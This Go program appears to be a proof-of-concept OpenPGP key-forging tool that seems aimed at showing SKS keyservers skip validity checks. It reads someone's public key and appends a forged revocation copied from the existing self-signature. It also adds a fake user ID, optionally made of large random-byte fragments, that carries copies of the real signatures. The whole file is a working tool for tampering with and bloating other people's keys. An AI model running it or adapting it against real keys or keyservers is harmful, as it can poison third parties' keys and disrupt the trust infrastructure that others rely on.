package main

import (
	"flag"
	"golang.org/x/crypto/openpgp"
	"golang.org/x/crypto/openpgp/packet"
	"log"
	"math/rand"
	"os"
) 

var fakeUid = flag.Bool("fakeUid", true, "whether to create a fake UID")
var uidHavoc = flag.Bool("uidHavoc", false, "use random bytes instead of UID name, comment and email")
var uidHavocLength = flag.Uint64("uidHavocLength", 2048, "length of each random UID fragment")
var uidName = flag.String("uidName", "Do not use SKS keyserver sites", "UID name")
var uidComment = flag.String("uidComment", "no validity checks", "UID comment")
var uidEmail = flag.String("uidEmail", "@", "UID email")

var fakeRevoke = flag.Bool("fakeRevoke", true, "whether to create a fake revocation certificate")
var revokeReason = flag.Uint("revokeReason", 2, "see https://tools.ietf.org/html/rfc4880#section-5.2.3.23")
var revokeReasonText = flag.String("revokeReasonText", "Do not trust this information", "revocation comment")

func randString(length uint64) string {
	buf := make([]byte, length)
	rand.Read(buf) // doesn't really fail
	return string(buf)
}

func main() {
	flag.Parse()

	entity, err := openpgp.ReadEntity(packet.NewReader(os.Stdin))

	if err != nil {
		log.Fatal(err)
	}

	var sig *packet.Signature

	for _, v := range entity.Identities {
		sig = v.SelfSignature
	}

	if *fakeRevoke {
		reason := uint8(*revokeReason)

		revocation := *sig
		revocation.RevocationReason = &reason
		revocation.RevocationReasonText = *revokeReasonText

		entity.Revocations = append(entity.Revocations, &revocation)
	}

	if *fakeUid {
		var p *packet.UserId

		if *uidHavoc {
			p = packet.NewUserId(
				randString(*uidHavocLength),
				randString(*uidHavocLength),
				randString(*uidHavocLength))
		} else {
			p = packet.NewUserId(*uidName, *uidComment, *uidEmail)
		}

		entity.Identities[p.Id] = &openpgp.Identity{
			Name:          p.Id,
			UserId:        p,
			SelfSignature: sig,
		}

		for _, v := range entity.Identities {
			entity.Identities[p.Id].Signatures =
				append(entity.Identities[p.Id].Signatures, v.Signatures...)
		}
	}

	err = entity.Serialize(os.Stdout)

	if err != nil {
		log.Fatal(err)
	}
}
